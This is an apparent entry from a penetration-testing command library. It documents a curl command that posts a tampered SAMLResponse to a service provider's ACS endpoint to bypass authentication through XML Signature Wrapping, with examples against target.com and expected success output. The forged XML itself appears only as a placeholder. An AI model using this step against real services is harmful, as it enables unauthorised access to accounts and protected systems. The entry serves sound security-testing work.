---
id: 9e9625d6-e813-4c4c-9382-6a33d2bc6e71
name: curl-post-modified-saml-response
type: command
executor: bash
data: >-
  curl -X POST -d "SAMLResponse=$_MODIFIED_SAML_BASE64&RelayState=$_RELAY_STATE"
  $_ACS_URL
output: null
created_at: '2023-04-06T03:56:32.162681+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - saml
  - web
verified: true
validated: true
---

# curl-post-modified-saml-response

## Command

```bash
curl -X POST -d "SAMLResponse=$_MODIFIED_SAML_BASE64&RelayState=$_RELAY_STATE" $_ACS_URL
```

## Description

This command sends a modified base64-encoded SAMLResponse via HTTP POST to the service provider's assertion consumer service (ACS) endpoint, exploiting XML Signature Wrapping to bypass authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_MODIFIED_SAML_BASE64 | Base64-encoded tampered SAML XML response | Yes |
| $_RELAY_STATE | Original RelayState parameter from the SAML flow (preserves session) | Yes |
| $_ACS_URL | URL of the SP's ACS endpoint (e.g., https://target.com/saml/acs) | Yes |
| -X POST | Specifies HTTP POST method | Built-in |
| -d | Data to post in the request body | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST -d "SAMLResponse=ModifiedBase64Here&RelayState=originalstate" https://target.com/saml/acs
```

### Advanced Usage (with Cookies)

```bash
curl -X POST -d "SAMLResponse=$_MODIFIED_SAML_BASE64&RelayState=$_RELAY_STATE" -b "session_cookie=value" $_ACS_URL
```

## Expected Output

HTTP/1.1 302 Found
Location: https://target.com/protected/dashboard
Set-Cookie: auth_session=abc123; Path=/

A redirect to the protected area indicates successful authentication bypass.

## Related

- [[procedures/SAML-Injection-with-XML-Signature-Wrapping]]
- [[tools/Burp-Suite]]
